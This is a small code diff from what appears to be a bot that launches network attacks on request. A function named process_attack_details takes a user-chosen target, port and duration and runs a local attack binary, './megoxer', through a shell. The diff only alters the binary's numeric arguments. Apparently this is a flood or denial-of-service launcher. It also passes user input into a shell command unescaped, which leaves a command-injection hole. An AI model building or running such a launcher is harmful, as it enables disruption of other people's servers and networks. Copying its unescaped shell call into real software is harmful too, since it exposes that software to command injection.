@@ -180,7 +180,7 @@ def process_attack_details(message):
         
         # Execute attack command (Modify as needed)
         log_command(user_id, target, port, duration)
-        full_command = f"./megoxer {target} {port} {duration} 900 MEG"
+        full_command = f"./megoxer {target} {port} {duration} 9 900"
         subprocess.Popen(full_command, shell=True)
 
         # Notify user
